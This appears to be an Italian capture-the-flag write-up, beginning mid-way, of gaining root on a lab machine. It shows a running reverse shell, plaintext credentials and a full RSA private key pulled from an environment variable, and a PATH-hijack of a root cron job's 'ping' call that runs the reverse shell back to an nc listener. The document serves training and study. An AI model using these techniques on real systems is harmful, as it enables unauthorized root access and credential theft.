root       911  0.0  0.3 281600  6612 ?        Ssl  09:25   0:00 /usr/lib/accountsservice/accounts-daemon
daemon     914  0.0  0.1  28132  2196 ?        Ss   09:25   0:00 /usr/sbin/atd -f
root       916  0.0  0.0   4384   700 ?        Ss   09:25   0:00 /usr/sbin/acpid
root       917  0.0  0.0  95352  1444 ?        Ssl  09:25   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       918  0.0  0.2  35884  4232 ?        Ss   09:25   0:00 /lib/systemd/systemd-logind
message+   922  0.0  0.1  43128  3972 ?        Ss   09:25   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root       960  0.0  0.2 284108  6124 ?        Ssl  09:25   0:00 /usr/lib/policykit-1/polkitd --no-debug
systemd+  1060  0.0  0.1  47552  4052 ?        Ss   09:25   0:00 /lib/systemd/systemd-resolved
root      1127  0.0  0.2  67820  5316 ?        Ss   09:25   0:00 /usr/sbin/sshd -D
root      1136  0.0  0.0   5212   152 ?        Ss   09:25   0:00 /sbin/iscsid
root      1140  0.0  0.1   5712  3500 ?        S<Ls 09:25   0:00 /sbin/iscsid
root      1241  0.0  0.0  19488   224 ?        Ss   09:25   0:00 /usr/sbin/irqbalance --pid=/var/run/irqbalance.pid
root      1249  0.0  0.0  14780  1832 tty1     Ss+  09:25   0:00 /sbin/agetty --noclear tty1 linux
root      1263  0.0  1.1 253440 24504 ?        Ss   09:25   0:00 /usr/sbin/apache2 -k start
www-data  1275  0.0  0.6 253868 12468 ?        S    09:25   0:00  \_ /usr/sbin/apache2 -k start
www-data  1276  0.0  0.5 253868 11756 ?        S    09:25   0:00  \_ /usr/sbin/apache2 -k start
www-data  1277  0.0  0.5 253868 11672 ?        S    09:25   0:00  \_ /usr/sbin/apache2 -k start
www-data  1278  0.0  0.5 253868 11668 ?        S    09:25   0:00  \_ /usr/sbin/apache2 -k start
www-data  1502  0.0  0.0   4492   708 ?        S    09:41   0:00  |   \_ sh -c timeout 1 host 10 || python /tmp/revshell.py 2>&1
www-data  1508  0.0  0.4  42012  9904 ?        S    09:41   0:00  |       \_ python /tmp/revshell.py
www-data  1509  0.0  0.0   4492   788 pts/0    Ss   09:41   0:00  |           \_ /bin/sh
www-data  1514  0.0  0.3  32384  7100 pts/0    S+   09:43   0:00  |               \_ python -c import pty;pty.spawn('/bin/bash')
www-data  1515  0.0  0.1  18324  3336 pts/1    Ss   09:43   0:00  |                   \_ /bin/bash
www-data  1653  0.0  0.1  34800  3096 pts/1    R+   10:00   0:00  |                       \_ ps auxf
www-data  1279  0.0  0.3 253464  7720 ?        S    09:25   0:00  \_ /usr/sbin/apache2 -k start
www-data  1332  0.0  0.3 253464  7720 ?        S    09:29   0:00  \_ /usr/sbin/apache2 -k start
www-data  1346  0.0  0.3 253464  7720 ?        S    09:29   0:00  \_ /usr/sbin/apache2 -k start
#+end_example

** uname -a
#+begin_example
www-data@hoster:/$ uname -a
Linux hoster 4.8.0-59-generic #64-Ubuntu SMP Thu Jun 29 19:38:34 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
#+end_example

Sistema operativo *Ubuntu a 64-bit*.
** cronjobs
*** /etc/crontabs
#+begin_example
www-data@hoster:/$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/monitoring:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/5 * * * * root /bin/bash /root/monitor.sh
#+end_example

C'è un cronjob che gira come root e che lancia *monitor.sh* che potrebbe
essere interessante.
*** /etc/cron.d
#+begin_example
www-data@hoster:/$ ls -la /etc/cron.d
total 24
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 96 root root 4096 Jun 18  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  589 Jul 26  2016 mdadm
-rw-r--r--  1 root root  670 Mar  1  2016 php
-rw-r--r--  1 root root  189 Jul 31  2019 popularity-contest


www-data@hoster:/$ cat /etc/cron.d/*
#
# cron.d/mdadm -- schedules periodic redundancy checks of MD devices
#
# Copyright © martin f. krafft <madduck@madduck.net>
# distributed under the terms of the Artistic Licence 2.0
#

# By default, run at 00:57 on every Sunday, but do nothing unless the day of
# the month is less than or equal to 7. Thus, only run on the first Sunday of
# each month. crontab(5) sucks, unfortunately, in this regard; therefore this
# hack (see #380425).
57 0 * * 0 root if [ -x /usr/share/mdadm/checkarray ] && [ $(date +\%d) -le 7 ]; then /usr/share/mdadm/checkarray --cron --all --idle --quiet; fi
# /etc/cron.d/php@PHP_VERSION@: crontab fragment for PHP
#  This purges session files in session.save_path older than X,
#  where X is defined in seconds as the largest value of
#  session.gc_maxlifetime from all your SAPI php.ini files
#  or 24 minutes if not defined.  The script triggers only
#  when session.save_handler=files.
#
#  WARNING: The scripts tries hard to honour all relevant
#  session PHP options, but if you do something unusual
#  you have to disable this script and take care of your
#  sessions yourself.

# Look for and purge old sessions every 30 minutes
09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && /usr/lib/php/sessionclean
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
2 0 * * *   root    test -x /etc/cron.daily/popularity-contest && /etc/cron.daily/popularity-contest --crond
#+end_example
** /
#+begin_example
www-data@hoster:/$ ls -la /
total 112
drwxr-xr-x  25 root root     4096 Sep 27  2019 .
drwxr-xr-x  25 root root     4096 Sep 27  2019 ..
drwxr-xr-x   2 root root    12288 Aug  5  2019 bin
drwxr-xr-x   3 root root     4096 Aug  5  2019 boot
drwxr-xr-x  18 root root     3780 May 28 09:25 dev
drwxr-xr-x  96 root root     4096 Jun 18  2020 etc
drwxr-xr-x   3 root root     4096 Jul 31  2019 home
lrwxrwxrwx   1 root root       32 Aug  5  2019 initrd.img -> boot/initrd.img-4.8.0-59-generic
lrwxrwxrwx   1 root root       32 Jul 30  2019 initrd.img.old -> boot/initrd.img-4.8.0-22-generic
drwxr-xr-x  23 root root     4096 Aug  5  2019 lib
drwxr-xr-x   2 root root     4096 Aug  5  2019 lib64
drwx------   2 root root    16384 Jul 30  2019 lost+found
drwxr-xr-x   2 root root     4096 Sep 27  2019 maintenance
drwxr-xr-x   3 root root     4096 Jul 30  2019 media
drwxr-xr-x   2 root root     4096 Oct 12  2016 mnt
drwxrwx---   6 root monitor  4096 Jun 16  2020 monitoring
drwxr-xr-x   2 root root     4096 Oct 12  2016 opt
dr-xr-xr-x 125 root root        0 May 28 07:25 proc
drwx------   5 root root     4096 Jun 16  2020 root
drwxr-xr-x  23 root root      880 May 28 09:25 run
drwxr-xr-x   2 root root    12288 Aug  5  2019 sbin
drwxr-xr-x   2 root root     4096 Oct  6  2016 snap
drwxr-xr-x   2 root root     4096 Oct 12  2016 srv
dr-xr-xr-x  13 root root        0 May 28 09:48 sys
drwxrwxrwt   8 root root     4096 May 28 10:12 tmp
drwxr-xr-x  10 root root     4096 Jul 30  2019 usr
drwxr-xr-x  14 root root     4096 Jul 31  2019 var
lrwxrwxrwx   1 root root       29 Aug  5  2019 vmlinuz -> boot/vmlinuz-4.8.0-59-generic
lrwxrwxrwx   1 root root       29 Jul 30  2019 vmlinuz.old -> boot/vmlinuz-4.8.0-22-generic
#+end_example

Notiamo che ci sono due cartelle che nono sono presenti di default: si
tratta di *maintenance* e di *monitoring*. Quest'ultima fa da home per
l'utente *monitor* e non abbiamo alcun permesso al suo interno
(tuttavia, dal cronjob, sappiamo che contiene un file chiamato
*monitor.sh*).

Entriamo nell prima:
#+begin_example
www-data@hoster:/$ ls maintenance/
tmp.txt
#+end_example

#+begin_example
www-data@hoster:/$ cat maintenance/tmp.txt 
web_8357243:password1
#+end_example

Vediamo che ci sono delle credenziali che riguardano l'utente non root
del sistema che ha un accesso alla macchina tramite ssh!

*web_8357243:password1*

** web_8357243
#+begin_example
www-data@hoster:/$ su web_8357243
Password: 
web_8357243@hoster:/$ whoami
web_8357243
#+end_example

Tramite la password, siamo riusciti a loggarci come utente
*web_8357243*.


** env
#+begin_example
web_8357243@hoster:~$ env
XDG_SESSION_ID=63
TERM=xterm-256color
SHELL=/bin/bash
SSH_CLIENT=192.168.56.101 36730 22
SSH_TTY=/dev/pts/2
USER=web_8357243
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
MAIL=/var/mail/web_8357243
PATH=/home/web_8357243/bin:/home/web_8357243/.local/bin:/monitoring:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin:/snap/bin
PWD=/home/web_8357243
LANG=en_GB.UTF-8
PRIVATE_KEY=-----BEGIN RSA PRIVATE KEY-----\MIICWwIBAAKBgQDU0G6Gpjz/dox5skVwO5eqGhZY5xfsfEEhQtDQsEXcnYD5zye2\Z0B64DwZYTNynyD3J0NT4zQ3F4YUheKxXeSnYDEFrANm9sV/QYF4eVGN4urBPPBq\p2jCdGoKPtQPZflZCbIfA3zxxzsL4cpjby2mbWKdEwWf/maDomgdL5j5eQIDAQAB\AoGATwIu9oiDPui5UHkR9I/7R6i1wT3SkPa0i2+t7Lx0w2oqNxRkjwCYXMYhKd7/\Zb+UUo3eHifM++Mc4UOvnN/aAmhFnJlT00q0RyCedpQB6dZgE7549nxz8qYwURnc\k8WbyODlNwCA2j1PBHbBqM50O1JZkppQOxSTslfSiVYKog0CQQD3aFtnMMOK+zZ1\cY5qrSxUq3gSNyZbG0Omqm0owTItDy561btvHdMMS3x1Pbci7AtFZlWCW9Cc0Qrr\Y3xGUJ8jAkEA3DSDLpC0KnH/77lZ8vG3VbnvMPdQFp3+o6GM7Fk8diTx7zSv3SPi\6dlEeIhCMoJ2m9Q0FJLmh9e0oTVKAfS8swJAIeSH8QD7KMT1Vu1xhyemFQtQbZ5k\gMKhZ+mc/qJIz2dvBKDXBofda6fDqwQDXKNdf+pe+Ha/g1wX1NtSIQfWZQJASHf/\tBNrN4zM7dfSAmIKM+w9C6BYexkD9FX2StITU85U0KRGPEDTLKKUJhaxsm29Gwt7\GEpAE/SpPWSMNpiUgQJAXT0q2ZBja33mjWVplswQ3SKNTdHZkZEKmotpaJ5BQJgf\nISx5dKQbb9cK5UuKaHJ87D1CJ7M/j97RHomBCwWZA==\-----END RSA PRIVATE KEY-----
SHLVL=1
HOME=/home/web_8357243
LANGUAGE=en_GB:en
LOGNAME=web_8357243
SSH_CONNECTION=192.168.56.101 36730 192.168.56.103 22
LESSOPEN=| /usr/bin/lesspipe %s
XDG_RUNTIME_DIR=/run/user/1000
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/env
#+end_example

Vediamo che c'è una chiave ssh (RSA) privata come variabile
d'ambiente, che sembra essere diversa da quella dell'utente
web_8357243!

#+begin_example
-----BEGIN RSA PRIVATE KEY-----
MIICWwIBAAKBgQDU0G6Gpjz/dox5skVwO5eqGhZY5xfsfEEhQtDQsEXcnYD5zye2
Z0B64DwZYTNynyD3J0NT4zQ3F4YUheKxXeSnYDEFrANm9sV/QYF4eVGN4urBPPBq
p2jCdGoKPtQPZflZCbIfA3zxxzsL4cpjby2mbWKdEwWf/maDomgdL5j5eQIDAQAB
AoGATwIu9oiDPui5UHkR9I/7R6i1wT3SkPa0i2+t7Lx0w2oqNxRkjwCYXMYhKd7/
Zb+UUo3eHifM++Mc4UOvnN/aAmhFnJlT00q0RyCedpQB6dZgE7549nxz8qYwURnc
k8WbyODlNwCA2j1PBHbBqM50O1JZkppQOxSTslfSiVYKog0CQQD3aFtnMMOK+zZ1
cY5qrSxUq3gSNyZbG0Omqm0owTItDy561btvHdMMS3x1Pbci7AtFZlWCW9Cc0Qrr
Y3xGUJ8jAkEA3DSDLpC0KnH/77lZ8vG3VbnvMPdQFp3+o6GM7Fk8diTx7zSv3SPi
6dlEeIhCMoJ2m9Q0FJLmh9e0oTVKAfS8swJAIeSH8QD7KMT1Vu1xhyemFQtQbZ5k
gMKhZ+mc/qJIz2dvBKDXBofda6fDqwQDXKNdf+pe+Ha/g1wX1NtSIQfWZQJASHf/
tBNrN4zM7dfSAmIKM+w9C6BYexkD9FX2StITU85U0KRGPEDTLKKUJhaxsm29Gwt7
GEpAE/SpPWSMNpiUgQJAXT0q2ZBja33mjWVplswQ3SKNTdHZkZEKmotpaJ5BQJgf
nISx5dKQbb9cK5UuKaHJ87D1CJ7M/j97RHomBCwWZA==
-----END RSA PRIVATE KEY-----
#+end_example

** monitor
Proviamo ad usare la chiave trovata per connetterci tramite ssh come
root, ma l'esito è negativo.

Proviamo quindi come utente *monitor* e invece riusciamo ad ottenere
l'accesso.
Abbiamo la home directory settata a */monitoring*. 
#+begin_example
monitor@hoster:~$ ls -la
total 48
drwxrwx---  6 root    monitor 4096 Jun 16  2020 .
drwxr-xr-x 25 root    root    4096 Sep 27  2019 ..
lrwxrwxrwx  1 root    root       9 Jul 31  2019 .bash_history -> /dev/null
drwx------  2 monitor monitor 4096 Jul 31  2019 .cache
-rwxr-x---  1 root    root    1097 Jul 31  2019 configuration.py
-rw-r-----  1 root    root    1227 Jul 31  2019 configuration.pyc
-rw-rw----  1 root    root       0 Jul 31  2019 down_sites_list.txt
drwx------  2 monitor monitor 4096 Jun 16  2020 .gnupg
-rw-r-x---  1 root    monitor 6871 Jul 31  2019 monitor.py
drwxrwxr-x  2 monitor monitor 4096 Jul 31  2019 .nano
drwxrwxr-x  2 monitor monitor 4096 Jul 31  2019 .ssh
-rw-------  1 monitor monitor  661 Jun 16  2020 .viminfo
-rw-rw-r--  1 monitor monitor  165 Aug  1  2019 .wget-hsts
#+end_example
** pspy
Utilizziamo pspy per vedere cosa lancia il cronjob che runna come root
ogni 5 minuti.
#+begin_example
web_8357243@hoster:/tmp$

2022/05/28 11:05:01 CMD: UID=0    PID=20393  | /bin/sh -c /bin/bash /root/monitor.sh 
2022/05/28 11:05:01 CMD: UID=0    PID=20392  | /usr/sbin/CRON -f 
2022/05/28 11:05:01 CMD: UID=0    PID=20394  | /bin/bash /root/monitor.sh 
2022/05/28 11:05:01 CMD: UID=0    PID=20395  | python /monitoring/monitor.py 
2022/05/28 11:05:01 CMD: UID=???  PID=20396  | ???
2022/05/28 11:05:01 CMD: UID=0    PID=20398  | /bin/sleep 5 
#+end_example

Vediamo che il file */root/monitor.sh* sembra lanciare il comando
~python /monitoring/monitor.py~ (notare che python non ha indicato il
path, quindi è PATH injectable! Inoltre gira come root).

C'è poi un processo che non viene propriamente identificato, ma dal
PID, è presumibile che venga lanciato da *monitor.py*.

Avendo accesso al codice, come utente *monitor*, vediamo cosa fa
*monitor.py*.
#+begin_src python
#!/usr/bin/env python
import sys
sys.path.append("/usr/lib/python2.7/")
import os
import smtplib
import subprocess
import time
import datetime
from configuration import settings, sites

class Color(object):
    """
    Colorize strings in terminal
    """
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    RESET = '\033[0m'

    def __init__(self):
        # Check if the system is windows, as ANSI escape codes do not work there
        self.should_colorize = True
        if sys.platform == 'win32':
            self.should_colorize = False

    def red(self, string):
        """
        Turns a string red
        """
        if not self.should_colorize:
            return string
        return '%s%s%s' % (self.RED, string, self.RESET)

    def green(self, string):
        """
        Turns a string green
        """
        if not self.should_colorize:
            return string
        return '%s%s%s' % (self.GREEN, string, self.RESET)

    def blue(self, string):
        """
        Turns a string blue
        """
        if not self.should_colorize:
            return string
        return '%s%s%s' % (self.BLUE, string, self.RESET)

    def yellow(self, string):
        """
        Turns a string yellow
        """
        if not self.should_colorize:
            return string
        return '%s%s%s' % (self.YELLOW, string, self.RESET)


class UptimeLogger(object):
    """
    Creates a file to check the last status of the hostname. Works by creating a file when the site is down
    and removing it when it is up
    """
    def __init__(self, hostname):
        # Set the file name
        self.file_location = os.path.join(os.getcwd(), 'down_sites_list.txt')
        self.hostname = hostname
        # Create the down site file if it does not exist
        if not os.path.isfile(self.file_location):
            open(self.file_location, 'w+').close()

    def was_up(self):
        """
        Checks if the site was up last time. Returns a boolean
        """
        site_list = open(self.file_location, 'r')
        down_sites = site_list.readlines()
        site_list.close()
        # Check if the site was down
        for site in down_sites:
            if site.strip() == self.hostname:
                # The hostname was found in the file, which means it was down previously
                return False
        # The hostname was not found in the file
        return True

    def mark_down(self):
        """
        Mark the site as down
        """
        # Check if the file already exists in the list
        if not self.was_up():
            return
        site_list = open(self.file_location, 'a')
        site_list.write(self.hostname + '\n')
        site_list.close()

    def mark_up(self):
        """
        Mark the site as up
        """
        # Check if the site was not in the list initially
        if self.was_up():
            return
        site_list = open(self.file_location, 'r')
        down_sites = site_list.readlines()
        site_list.close()

        new_sites_list = []
        for site in down_sites:
            # Check for the site and remove it if found
            if site.strip() == self.hostname:
                continue
            new_sites_list.append(site)
        # Write the new list
        site_list = open(self.file_location, 'w')
        site_list.writelines(new_sites_list)
        site_list.close()


class UptimeChecker(object):
    """
    Checks the uptime of a site
    """

    def __init__(self, hostname):
        self.hostname = hostname
        self.check_up()

    def check_up(self):
        """
        Checks if the site is up and sets the class variables did_change and is_up
        """
        if sys.platform == 'win32':
            ping = 'ping -n 1 '
        else:
            ping = 'ping -c 1 '
        process = subprocess.Popen(
            ping + self.hostname,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True
        )
        process.wait()
        uptime_logger = UptimeLogger(self.hostname)

        self.did_change = False
        color = Color()
        if process.returncode == 0:
            # If the site is up, check if the site was previously down
            self.is_up = True

            if uptime_logger.was_up():
                # The site is still up
                print color.blue('Site %s is still up' % self.hostname)
            else:
                # The site went from down to up
                print color.green('Site %s went back up' % self.hostname)
                self.did_change = True
                uptime_logger.mark_up()
        else:
            # If the site was not previously down, send the email
            self.is_up = False
            if uptime_logger.was_up():
                # Site went down
                print color.red('Site %s went down' % self.hostname)
                self.did_change = True
                uptime_logger.mark_down()
            else:
                # Site is still down
                print color.yellow('Site %s is still down' % self.hostname)
        return self.is_up

def send_email(recipient, subject, body):
    """
    Sends an e-mail to the specified recipient.
    """
    sender = settings.get('monitor_email', None)
    passwd = settings.get('monitor_password', None)
    def_subject = settings.get('email_subject', None)
    if not def_subject is None:
        subject = def_subject
    print 'Sending email to %s: %s' % (recipient, subject)
    headers = ['From: ' + sender,
               'Subject: ' + subject,
               'To: ' + recipient,
               'MIME-Version: 1.0',
               'Content-Type: text/html']
    headers = '\r\n'.join(headers)
    server = settings.get('email_server', 'smtp.gmail.com')
    port = settings.get('email_server_port', 587)
    session = smtplib.SMTP(server, port)
    session.ehlo()
    session.starttls()
    session.ehlo()
    session.login(sender, passwd)
    session.sendmail(sender, recipient, headers + '\r\n\r\n' + body)
    session.quit()

ts = time.time()
now = datetime.datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')

for site in sites:
    nicename = site[0]
    hostname = site[1]
    recipients = site[2]
    checker = UptimeChecker(hostname)
    # The site status changed from it's last value, so send an email
    if checker.did_change:
        if checker.is_up:
            # The site went back up
            subject = '%s up' % nicename
            body = '%s went back up at %s' % (hostname, now)
        else:
            # The site went down
            subject = '%s down' % nicename
            body = '%s went down at %s' % (hostname, now)

        # need to troubleshoot issue with email server
        #
        # for recipient in recipients:
        # send_email(recipient, subject, body)
#+end_src

Effettivamente, nel metodo *check_up()* della classe *UptimeChecker*,
viene lanciato un sottoprocesso per effettuare il ping di un host:
#+begin_src python
    ping = 'ping -c 1 '
        process = subprocess.Popen(
            ping + self.hostname,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True
        )
        process.wait()
#+end_src

Anche il comando *ping* è PATH injectable, perché invocato senza il
path assoluto!
** exploit PATH injectable command invoked by cronjob
Proviamo ad exploitare il comando *ping* facendogli invece spawnare una
shell.
#+begin_example
monitor@hoster:~$ echo $PATH
/monitoring:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin:/snap/bin
#+end_example 

Vediamo che la cartella /monitoring è già in cima alla lista delle
cartelle delle variabile d'ambiente PATH. Creando un file chiamato
*ping* in tale directory, dovrebbe essere invocato lui al posto del ping
originale, le cui locazioni sono:
#+begin_example
monitor@hoster:~$ whereis ping
ping: /bin/ping /usr/share/man/man8/ping.8.gz
#+end_example

Sfruttiamo nano per creare il file ping:
#+begin_src sh
#!/bin/sh

python /tmp/revshell.py
#+end_src

Chiamiamo la stessa reverse shell usata per entrare nella macchina,
che stavolta verrà lanciata come root.
Diamo i permessi di esecuzione la file ping appena creato:
#+begin_example
monitor@hoster:~$ chmod +x ping
#+end_example

sulla macchina attaccante ci mettiamo in ascolto:
#+begin_example
$ nc -lvnp 4321
listening on [any] 4321 ...
#+end_example

E trascorsi i 5 minuti necessari per il run del cronjob, otteniamo una
shella da root:
#+begin_example
$ nc -lvnp 4321
listening on [any] 4321 ...
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.103] 53100
# whoami
whoami
root
#+end_example

*** root flag
#+begin_example
# cat flag.txt	
cat flag.txt
VDSI{You_g0t_r00t!!!}
#+end_example
